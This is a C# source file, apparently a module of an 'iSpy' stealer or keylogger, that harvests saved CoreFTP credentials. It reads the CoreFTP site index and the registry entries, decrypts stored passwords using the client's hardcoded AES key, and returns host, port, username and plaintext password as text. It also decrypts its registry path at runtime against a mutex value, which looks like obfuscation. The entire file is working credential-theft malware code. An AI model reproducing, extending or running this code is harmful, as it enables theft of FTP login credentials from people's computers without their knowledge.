using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Text;
using System.IO;
namespace iSpy.Password_Recovery
{
    public class CoreFTP
    {
        public static string Recover()
        {
            string sPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CoreFTP\\sites.idx";
            if (!File.Exists(sPath))
                return string.Empty;
            StringBuilder RegBuilder = new StringBuilder();
            using (StreamReader Reader = new StreamReader(sPath))
            {
                string line = "";
                while ((line = Reader.ReadLine()) != null)
                {
                    try
                    {
                        RegBuilder.Append(line.Split(new string[] { "  " }, StringSplitOptions.None)[0].ToString() + " ");
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            string[] RegistryPaths = RegBuilder.ToString().Substring(0, RegBuilder.ToString().Length - 2).Split(' ');
            string structure = string.Empty;
            string sHost = "";
            string sPort = "";
            string sUser = "";
            string sPassword = "";
            string registryPath = StringCipher.Decrypt("[REGISTRYCOREFTP]", Config.MUTEX);
            foreach (string path in RegistryPaths)
            {

                sHost = Registry.GetValue(string.Format(registryPath + "{0}", path), "Host", " ").ToString();
                sUser = Registry.GetValue(string.Format(registryPath + "{0}", path), "User", " ").ToString();
                sPort = Registry.GetValue(string.Format(registryPath + "{0}", path), "Port", " ").ToString();
                sPassword = DecryptCoreFTPPassword(Registry.GetValue(string.Format(registryPath + "{0}", path), "PW", " ").ToString());
                if (!string.IsNullOrEmpty(sUser) && !string.IsNullOrEmpty(sPort) && !string.IsNullOrEmpty(sHost))
                {
                    structure += "[CoreFTP]";
                    structure += "Host: " + sHost + Environment.NewLine;
                    structure += "Port: " + sPort + Environment.NewLine;
                    structure += "Username: " + sUser + Environment.NewLine;
                    structure += "Password: " + sPassword + Environment.NewLine + Environment.NewLine;
                }
                else { continue; }
            }
            return structure;
        }
        private static string DecryptCoreFTPPassword(string HexString)
        {
            StringBuilder buffer = new StringBuilder(HexString.Length * 3 / 2);
            for (int i = 0; i < HexString.Length; i++)
            {
                if ((i > 0) & (i % 2 == 0))
                    buffer.Append("-");
                buffer.Append(HexString[i]);
            }

            string Reversed = buffer.ToString();

            int length = (Reversed.Length + 1) / 3;
            byte[] arr = new byte[length];
            for (int i = 0; i < length; i++)
            {
                arr[i] = Convert.ToByte(Reversed.Substring(3 * i, 2), 16);
            }

            RijndaelManaged AES = new RijndaelManaged()
            {
                Mode = CipherMode.ECB,
                Key = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk"),
                Padding = PaddingMode.Zeros,
            };
            ICryptoTransform Transform = AES.CreateDecryptor(AES.Key, AES.IV);
            return Encoding.UTF8.GetString(Transform.TransformFinalBlock(arr, 0, arr.Length));
        }
    }
}